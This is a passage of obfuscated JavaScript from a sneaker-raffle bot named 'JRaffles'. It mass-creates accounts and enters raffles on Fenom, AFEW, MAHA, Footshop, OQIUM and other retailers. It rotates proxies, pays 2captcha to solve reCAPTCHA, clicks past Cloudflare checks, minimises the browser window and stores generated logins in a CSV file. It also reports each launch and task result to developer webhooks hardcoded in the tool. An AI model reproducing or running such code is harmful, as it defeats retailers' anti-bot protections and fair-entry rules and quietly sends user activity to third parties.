                _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x5a1a70['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x5a1a70['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x5ca215, _0x5a1a70['succesPUBMSG']);
            } catch (_0x1820a5) {
                console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1820a5));
            }
        } catch (_0x3ad9ff) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20' + _0x3ad9ff)), _0x21dc3f = 'yes', _0x3b4865 = '' + _0x3ad9ff;
            var _0x37408b = await _0x5b798c(_0x70a84a[_0x6030c2], _0x1d5fb9, 'dev', !![], _0x3b4865), _0x31cc17 = await _0x5b798c(_0x70a84a[_0x6030c2], _0x1d5fb9, 'dev', ![]), _0x5cbd43 = await _0x5b798c(_0x70a84a[_0x6030c2], _0x1d5fb9, 'pub', ![]);
            const _0x53a02d = {
                'succesDEVMSG': { 'embeds': [_0x31cc17] },
                'succesPUBMSG': { 'embeds': [_0x5cbd43] }
            };
            _0x53a02d['errorDEV'] = { 'embeds': [_0x37408b] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x53a02d['errorDEV']), await _0x331f59(_0x40d0b0, _0x53a02d['errorDEV']);
        } finally {
            _0x17f730['close']();
            if (_0x21dc3f == 'yes' && _0x113f88 != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Task\x20' + (_0x6030c2 + 0x1) + '\x20:\x20Retrying')), _0x6030c2 = _0x6030c2 - 0x1, _0x113f88 = _0x113f88 + 0x1;
                continue;
            }
            _0x21dc3f == 'yes' && _0x113f88 >= 0x5 && (_0x20b8ba(_0x70a84a[_0x6030c2], _0x1d5fb9), _0x21dc3f = 'no', _0x113f88 = 0x0), console['log'](_0x21f008() + '\x20[' + _0x1d5fb9['name'] + ']\x20Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x574e0d(_0x2b530e, _0x3c9e03, _0x26276c) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x10449a = 0x0; _0x10449a < _0x2b530e['length']; _0x10449a++) {
        if (_0x5ddd6d != 'yes')
            var _0x5ddd6d = '', _0x5ab6d4 = 0x0;
        var _0x32bffa;
        await _0x3e9f80(_0x2b530e, _0x10449a), _0x4204b1(_0x26276c['name'] + '\x20Task\x20' + (_0x10449a + 0x1) + '\x20/\x20' + _0x2b530e['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        var _0x18a746 = await _0x5b798c(_0x2b530e[_0x10449a], _0x26276c, 'acc', ![]);
        const _0x14a9e2 = { 'succesDEVMSG': { 'embeds': [_0x18a746] } }, _0x2bb369 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x5a2af6 = Math['round'](Math['random']() * (_0x3c9e03['length'] - 0x1)), _0x12f348 = _0x3c9e03[_0x5a2af6]['split'](':'), _0x372c4e;
        try {
            _0x372c4e = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x12f348[0x0] + ':' + _0x12f348[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x372c4e = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x12f348[0x0] + ':' + _0x12f348[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x31e702 = await _0x372c4e['newPage']();
            await _0x31e702['setViewport']({
                'width': 0x500 + _0x3b3e48(0x1, 0x32),
                'height': 0x2d9 + _0x3b3e48(0x1, 0x32)
            });
            const _0x538260 = await _0x31e702['target']()['createCDPSession'](), { windowId: _0x5480e4 } = await _0x538260['send']('Browser.getWindowForTarget');
            await _0x31e702['authenticate']({
                'username': '' + _0x12f348[0x2],
                'password': '' + _0x12f348[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31e702['goto']('' + _0x2bb369, { 'waitUntil': 'networkidle2' }), await _0x4e5841(0x1388), console['log'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x3ca33a = await _0x31e702['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x3ca33a && await _0x3ca33a['click']();
            } catch {
            }
            await _0x538260['send']('Browser.setWindowBounds', {
                'windowId': _0x5480e4,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x31e702['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x4e5841(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x31e702['type']('input[name=\x22firstname\x22]', '' + _0x2b530e[_0x10449a]['FirstName']), await _0x4e5841(0x1f4), await _0x31e702['type']('input[name=\x22lastname\x22]', '' + _0x2b530e[_0x10449a]['LastName']), await _0x4e5841(0x1f4), await _0x31e702['type']('input[name=\x22email\x22]', '' + _0x2b530e[_0x10449a]['Email']), await _0x4e5841(0x1f4), await _0x31e702['type']('input[name=\x22password\x22]', '' + _0x2b530e[_0x10449a]['Password']), await _0x4e5841(0x258), await _0x31e702['$eval']('input[name=\x22psgdpr\x22]', _0x47caac => _0x47caac['click']()), await _0x4e5841(0x1f4), console['log'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x31e702['$eval']('#customer-form', _0xcfe13c => _0xcfe13c['submit']());
            try {
                await _0x31e702['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x5ddd6d = 'no', console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Account\x20' + _0x2b530e[_0x10449a]['Email'] + '\x20Generated')), _0x3fdbd7['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2b530e[_0x10449a]['Email'] + ',' + _0x2b530e[_0x10449a]['Password']);
                try {
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x14a9e2['succesDEVMSG']);
                } catch {
                }
                await _0x331f59(_0x2055ba, _0x14a9e2['succesDEVMSG']);
            } catch (_0x5c814) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x5c814);
            }
        } catch (_0x214672) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20' + _0x214672)), _0x32bffa = '' + _0x214672;
            var _0x21ef4d = await _0x5b798c(_0x2b530e[_0x10449a], _0x26276c, 'acc', !![], _0x32bffa);
            _0x14a9e2['errorDEV'] = { 'embeds': [_0x21ef4d] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x14a9e2['errorDEV']), await _0x331f59(_0x40d0b0, _0x14a9e2['errorDEV']), _0x5ddd6d = 'yes';
        } finally {
            _0x372c4e['close']();
            if (_0x5ddd6d == 'yes' && _0x5ab6d4 != 0x5 && _0x32bffa != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Task\x20' + (_0x10449a + 0x1) + '\x20:\x20Retrying')), _0x10449a = _0x10449a - 0x1, _0x5ab6d4 = _0x5ab6d4 + 0x1;
                continue;
            }
            _0x5ddd6d == 'yes' && _0x5ab6d4 >= 0x5 && (_0x20b8ba(_0x2b530e[_0x10449a], _0x26276c), _0x5ddd6d = 'no', _0x5ab6d4 = 0x0), console['log'](_0x21f008() + '\x20[' + _0x26276c['name'] + ']\x20Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0xb03a45(_0x547ce4, _0x2f6320, _0x5eff2b) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x44e7a7 = 0x0; _0x44e7a7 < _0x547ce4['length']; _0x44e7a7++) {
        if (_0x18d14c != 'yes')
            var _0x18d14c = '', _0x4a1777 = 0x0;
        var _0xb2f76f;
        await _0x3e9f80(_0x547ce4, _0x44e7a7), _0x4204b1(_0x5eff2b['name'] + '\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20/\x20' + _0x547ce4['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446);
        const _0x432b37 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x16294e = Math['round'](Math['random']() * (_0x2f6320['length'] - 0x1)), _0xa3c33d = _0x2f6320[_0x16294e]['split'](':'), _0x39ff9e;
        try {
            _0x39ff9e = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0xa3c33d[0x0] + ':' + _0xa3c33d[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x39ff9e = await _0x4ec495['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0xa3c33d[0x0] + ':' + _0xa3c33d[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x44a865 = await _0x39ff9e['newPage'](), _0x5d781c = await _0x44a865['target']()['createCDPSession'](), { windowId: _0x4473b1 } = await _0x5d781c['send']('Browser.getWindowForTarget');
            await _0x44a865['authenticate']({
                'username': '' + _0xa3c33d[0x2],
                'password': '' + _0xa3c33d[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x44a865['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4e5841(0xbb8), await _0x5d781c['send']('Browser.setWindowBounds', {
                'windowId': _0x4473b1,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x4e5841(0x1f40);
            try {
                await _0x44a865['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            await _0x4e5841(0x1388), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Logging\x20in'), await _0x44a865['type']('input[name=\x22email\x22]', '' + _0x547ce4[_0x44e7a7]['Email']), await _0x4e5841(0x1f4), await _0x44a865['type']('input[name=\x22password\x22]', '' + _0x547ce4[_0x44e7a7]['Password']), await _0x4e5841(0x258), await _0x44a865['$eval']('#login-form', _0xf92564 => _0xf92564['submit']()), await _0x44a865['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x4e5841(0x1f4), await _0x44a865['goto']('' + _0x547ce4[_0x44e7a7]['Url']), await _0x44a865['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x547ce4[_0x44e7a7]['Size']);
            if (_0x547ce4[_0x44e7a7]['Size'] != 'RANDOM') {
                var _0x4ef8b4 = '\x20' + _0x547ce4[_0x44e7a7]['Size'] + '\x20';
                const _0x15c88a = await _0x44a865['$x']('//span[contains(text(),\x20' + _0x4ef8b4 + ')]');
                await _0x15c88a[0x0]['click']();
            } else {
                const _0x38fe6e = await _0x44a865['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                var _0x3ad937 = Math['round'](Math['random']() * (_0x38fe6e['length'] - 0x1));
                await _0x38fe6e[_0x3ad937]['click']();
            }
            await _0x4e5841(0x258), await _0x44a865['click']('#cookieChoiceDismiss'), await _0x4e5841(0x3e8), await _0x44a865['type']('#instagram-account', '' + _0x547ce4[_0x44e7a7]['Follower']), await _0x4e5841(0x28a), await _0x44a865['click']('#book-btn'), await _0x4e5841(0xbb8), await _0x44a865['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x4e5841(0x1f4), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20' + _0x108b38['cyan']('Solving\x20Captcha')), await _0x44a865['solveRecaptchas'](), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4e5841(0x7d0), await _0x44a865['$eval']('#book-btn-for-sure', _0x5e00af => _0x5e00af['click']()), await _0x4e5841(0x12c), await _0x44a865['click']('#book-btn-for-sure'), await _0x4e5841(0xdac);
            const _0x3e8c4b = await _0x44a865['$eval']('.reservation-popup\x20>\x20.title', _0x4ad878 => {
                return _0x4ad878['innerHTML'];
            });
            if (_0x3e8c4b) {
                _0x18d14c = 'no', _0x4fb703(_0x547ce4[_0x44e7a7], _0x5eff2b), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                var _0x299639 = await _0x5b798c(_0x547ce4[_0x44e7a7], _0x5eff2b, 'dev', ![]), _0x166acf = await _0x5b798c(_0x547ce4[_0x44e7a7], _0x5eff2b, 'pub', ![]);
                const _0x2dacc1 = {
                    'succesDEVMSG': { 'embeds': [_0x299639] },
                    'succesPUBMSG': { 'embeds': [_0x166acf] }
                };
                try {
                    _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x2dacc1['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x2dacc1['succesDEVMSG']), await _0x4e5841(0xc8), await _0x331f59(_0x5ca215, _0x2dacc1['succesPUBMSG']);
                } catch (_0x2c60ea) {
                    console['log'](_0x108b38['yellow'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2c60ea));
                }
            } else
                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
        } catch (_0x335c4b) {
            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20' + _0x335c4b)), _0xb2f76f = '' + _0x335c4b;
            var _0x60f88 = await _0x5b798c(_0x547ce4[_0x44e7a7], _0x5eff2b, 'dev', !![], _0xb2f76f), _0x299639 = await _0x5b798c(_0x547ce4[_0x44e7a7], _0x5eff2b, 'dev', ![]), _0x166acf = await _0x5b798c(_0x547ce4[_0x44e7a7], _0x5eff2b, 'pub', ![]);
            const _0x2392cf = {
                'succesDEVMSG': { 'embeds': [_0x299639] },
                'succesPUBMSG': { 'embeds': [_0x166acf] }
            };
            _0x2392cf['errorDEV'] = { 'embeds': [_0x60f88] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x2392cf['errorDEV']), await _0x331f59(_0x40d0b0, _0x2392cf['errorDEV']), _0x335c4b != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x18d14c = 'yes');
        } finally {
            _0x39ff9e['close']();
            if (_0x18d14c == 'yes' && _0x4a1777 != 0x5 && _0xb2f76f != 'Size\x20Not\x20Found') {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Task\x20' + (_0x44e7a7 + 0x1) + '\x20:\x20Retrying')), _0x44e7a7 = _0x44e7a7 - 0x1, _0x4a1777 = _0x4a1777 + 0x1;
                continue;
            }
            _0x18d14c == 'yes' && _0x4a1777 >= 0x5 && (_0x20b8ba(_0x547ce4[_0x44e7a7], _0x5eff2b), _0x18d14c = 'no', _0x4a1777 = 0x0), console['log'](_0x21f008() + '\x20[' + _0x5eff2b['name'] + ']\x20Waiting\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
        }
    }
}
async function _0x325b47() {
    await _0x1fc110(), console['clear']();
    if (_0x4351c2 != 'devkey') {
        let _0x5d033d = await _0x2ea972['autoUpdate']();
        if (_0x5d033d === 'yes')
            return _0x4a6bf3('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1d3ec3 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4e5841(0x2710);
        ;
    }
    await _0x51b64d(_0x1d3ec3);
    if (_0x5e1d73 === ![])
        return console['log']('Closing\x20Browser'), await _0x4e5841(0xbb8);
    else
        try {
            var _0x40e48a = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x4ca7a9
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x4351c2
                    }
                ]
            }];
            const _0x2f49fb = { 'embeds': _0x40e48a };
            var _0x1dfec6 = await _0x5b798c(null, null, 'open', ![]);
            const _0x2d72a3 = { 'openDEVMSG': { 'embeds': [_0x1dfec6] } };
            await _0x331f59(_0x5052e4, _0x2d72a3['openDEVMSG']);
            async function _0x39a975() {
                _0x4204b1('JRaffles\x20' + _0x4351c2), console['clear'](), console['log']('Welcome\x20to\x20' + _0x108b38['cyan']('JRaffles();') + '\x20' + _0x4351c2), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x2cbf9a = 0x0; _0x2cbf9a < _0x3962b3['length'] - 0x3; _0x2cbf9a++) {
                    if (_0x3962b3[_0x2cbf9a]['name'] === 'Reload\x20Settings' || _0x3962b3[_0x2cbf9a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x2cbf9a + ')\x20[' + _0x3962b3[_0x2cbf9a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3962b3['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3962b3['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3962b3['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x5e9074();
                if (taskModule > _0x3962b3['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4e5841(0x3e8), _0x39a975();
                if (_0x3962b3[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                    var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x2fe0ac = await _0x286f71(), _0x4cb2be = await _0x239535();
                        await _0x159c25(_0x4cb2be, _0x2fe0ac, _0x250b30);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x2fe0ac = await _0x286f71(), _0x4cb2be = await _0x239535();
                            await _0xc0fd4(_0x4cb2be, _0x2fe0ac, _0x250b30);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x2fe0ac = await _0x286f71(), _0x382c42 = await _0x148442(), _0x36c2c6 = _0x382c42['split'](';');
                                await _0x58ea1b(_0x36c2c6, _0x2fe0ac, _0x250b30);
                            }
                        }
                    }
                    return _0x39a975();
                }
                if (_0x3962b3[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                        var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x2fe0ac = await _0x286f71(), _0x2232ea = await _0x239535();
                            await _0xb03a45(_0x2232ea, _0x2fe0ac, _0x250b30);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x2fe0ac = await _0x286f71(), _0x2232ea = await _0x239535();
                                await _0x574e0d(_0x2232ea, _0x2fe0ac, _0x250b30);
                            }
                        }
                    } catch (_0x4bc6a) {
                        console['log'](_0x4bc6a), await _0x4e5841(0xfa0);
                    }
                    return _0x39a975();
                }
                if (_0x3962b3[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                    var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x2fe0ac = await _0x286f71(), _0x7005c5 = await _0x239535();
                    if (_0x7005c5[0x0]['Url'] == '' || _0x7005c5[0x0]['Url'] == undefined) {
                        await _0x24a99c(_0x2fe0ac);
                        var _0x4abf3f = await _0x5f08f4();
                        return await afewFunction('' + _0x531a02[_0x4abf3f], 'nor', _0x250b30, _0x7005c5, _0x2fe0ac), _0x39a975();
                    }
                    return await afewFunction(_0x7005c5[0x0]['Url'], 'nor', _0x250b30, _0x7005c5, _0x2fe0ac), _0x39a975();
                } else {
                    if (_0x3962b3[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                        var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x2fe0ac = await _0x286f71(), _0x2dda0d = await _0x239535();
                            console['log']('Starting\x20' + _0x2dda0d['length'] + '\x20MAHA\x20Tasks');
                            for (var _0x3fbda3 = 0x0; _0x3fbda3 < _0x2dda0d['length']; _0x3fbda3++) {
                                console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Getting\x20Session');
                                try {
                                    await _0x38445e(_0x3fbda3, 'nor', _0x250b30, _0x2dda0d, _0x2fe0ac), console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Sleeping\x20for\x20' + _0x4c3205['MahaDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['MahaDelay']);
                                } catch (_0x5f27ae) {
                                    console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Error\x20' + _0x5f27ae));
                                }
                            }
                            ;
                            return _0x39a975();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x2fe0ac = await _0x286f71();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x382c42 = await _0x148442(), _0x36c2c6 = _0x382c42['split'](';'), console['log'](_0x36c2c6['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0x3fbda3 = 0x0; _0x3fbda3 < _0x36c2c6['length']; _0x3fbda3++) {
                                    _0x250b30['url'] = _0x36c2c6[_0x3fbda3], console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Getting\x20Session');
                                    try {
                                        await _0x38445e(_0x3fbda3, 'ver', _0x250b30, _0x2dda0d, _0x2fe0ac), console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Sleeping\x20for\x20' + _0x4c3205['verificationDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['verificationDelay']);
                                    } catch (_0x523a3a) {
                                        console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Error\x20' + _0x523a3a));
                                    }
                                }
                                ;
                                return _0x39a975();
                            }
                        }
                    } else {
                        if (_0x3962b3[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                            var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction], _0x2fe0ac = await _0x286f71(), _0x35206d = await _0x239535();
                            return await _0x9c0bbf(_0x35206d, _0x2fe0ac, _0x250b30), await _0x4e5841(0x1388), _0x39a975();
                        } else {
                            if (_0x3962b3[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x2fe0ac = await _0x286f71(), _0x239a61 = await _0x239535();
                                    console['log']('Starting\x20' + _0x108b38['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0x3fbda3 = 0x0; _0x3fbda3 < _0x239a61['length']; _0x3fbda3++) {
                                        console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x680e5f(_0x3fbda3, 'nor', _0x250b30, _0x239a61, _0x2fe0ac);
                                        } catch (_0x161ac2) {
                                            console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Task\x20failed\x20' + _0x161ac2));
                                        }
                                        console['log'](_0x21f008() + '\x20[' + _0x250b30['name'] + ']\x20Sleeping\x20for\x20' + _0x4c3205['delay'] + '\x20ms'), await _0x4e5841(_0x4c3205['delay']);
                                    }
                                    return _0x39a975();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x2fe0ac = await _0x286f71();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), _0x382c42 = await _0x148442(), _0x36c2c6 = _0x382c42['split'](';'), console['log'](_0x36c2c6['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0x3fbda3 = 0x0; _0x3fbda3 < _0x36c2c6['length']; _0x3fbda3++) {
                                            try {
                                                _0x250b30['url'] = _0x36c2c6[_0x3fbda3], console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Task\x20' + (_0x3fbda3 + 0x1) + ':\x20Getting\x20Session'), await _0x680e5f(_0x3fbda3, 'ver', _0x250b30, null, _0x2fe0ac), console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x4c3205['verificationDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['verificationDelay']);
                                            } catch (_0x1f9065) {
                                                console['log'](_0x1f9065), await _0x4e5841(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x39a975();
                                    }
                                }
                                ;
                            } else {
                                if (_0x3962b3[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                    var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x267021('https://bouncewear.com/nl/account/register', _0x250b30);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3962b3[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                        var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x2fe0ac = await _0x286f71(), _0x35246d = await _0x239535();
                                            return await _0x823fb6('https://patta.nl/account/register', _0x250b30, _0x35246d, _0x2fe0ac), _0x39a975();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x2fe0ac = await _0x286f71(), _0x35246d = await _0x239535();
                                                return await _0x14d30c('', _0x250b30, _0x35246d, _0x2fe0ac), _0x39a975();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3962b3[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x190ee0(_0x3962b3[taskModule]['modules']);
                                            var _0x250b30 = _0x3962b3[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x2fe0ac = await _0x286f71(), _0x32019e = await _0x239535();
